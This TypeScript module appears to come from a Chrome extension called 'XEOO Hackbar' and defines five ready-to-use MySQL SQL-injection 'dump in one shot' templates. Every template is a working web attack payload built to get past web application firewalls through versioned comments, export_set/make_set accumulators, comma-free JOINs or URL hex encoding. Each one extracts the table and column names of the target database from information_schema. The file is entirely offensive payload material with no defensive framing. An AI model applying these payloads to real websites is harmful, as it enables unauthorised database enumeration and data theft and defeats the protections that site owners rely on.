/**
 * XEOO HACKBAR — Security Testing & HTTP Inspection Chrome Extension
 * 
 * @module WafBasedLocalVarDios
 * @author Zone Xploiter / ZXMarchia
 * @license MIT
 * @description WAF-Evasion Local session variable based Dump In One Shot templates.
 */

import { BuilderSubcategory, BuilderTemplate } from '../../types';

export const localVarDiosTemplates: BuilderTemplate[] = [
  {
    id: 'waf-local-var-dios-version-comment',
    name: 'Local Variable Version Comment (/*!50000...*/)',
    description: 'WAF bypass local variable loop with MySQL versioned comments',
    content: '(/*!50000SELECT*/(/*!50000@a*/)FROM(/*!50000SELECT*/(@a:=0x00),(@b:=0x00),(/*!50000SELECT*/(0)FROM(information_schema.columns)WHERE(table_schema=database())AND(@a)AND(@a:=/*!50000concat*/(@a,0x0a,table_name,0x3a,column_name))))a)'
  },
  {
    id: 'waf-local-var-dios-export-set',
    name: 'Local export_set() Variable WAF',
    description: 'WAF bypass local schema dump using export_set() variable accumulator and comments',
    content: '(/*!50000SELECT*/+/*!50000export_set*/(5,@:=0,(/*!50000SELECT*/+count(*)FROM(information_schema.columns)WHERE(table_schema=database())AND(@:=concat(@,0x0a,table_name,0x3a,column_name))),@,2))'
  },
  {
    id: 'waf-local-var-dios-make-set',
    name: 'Local make_set() Variable WAF',
    description: 'WAF bypass local schema dump using make_set() bitwise accumulator and comments',
    content: '(/*!50000SELECT*/+/*!50000make_set*/(6,@:=0x0a,(/*!50000SELECT*/+count(*)FROM(information_schema.columns)WHERE(table_schema=database())AND(@:=concat(@,table_name,0x3a,column_name,0x0a))),@))'
  },
  {
    id: 'waf-local-var-dios-no-comma',
    name: 'Local No-Comma JOIN Variable WAF',
    description: 'WAF bypass local variable schema dump initialized with JOIN (no commas)',
    content: '(/*!50000SELECT*/(@a)FROM(/*!50000SELECT*/(1))x JOIN(/*!50000SELECT*/(@a:=0x00))y JOIN(/*!50000SELECT*/(0)FROM(information_schema.columns)WHERE(table_schema=database())AND(@a:=/*!50000concat*/(@a,0x0a,table_name,0x3a,column_name)))z)'
  },
  {
    id: 'waf-local-var-dios-url-hex',
    name: 'Local Variable URL Hex (%xx)',
    description: 'Local variable schema dump encoded in URL hex to defeat regex WAF inspection',
    content: '%28SELECT%28%40a%29FROM%28SELECT%28%40a%3a%3d0x00%29%2c%28SELECT%280%29FROM%28information%5fschema%2ecolumns%29WHERE%28table%5fschema%3ddatabase%28%29%29AND%28%40a%29AND%28%40a%3a%3dCONCAT%28%40a%2c0x0a%2ctable%5fname%2c0x3a%2ccolumn%5fname%29%29%29%29a%29'
  }
];

export const localVarDiosSubcategory: BuilderSubcategory = {
  id: 'local-var-dios',
  label: 'Local Variable Dios',
  description: 'WAF bypass local schema variable-based DIOS templates filtered by database()',
  templates: localVarDiosTemplates
};
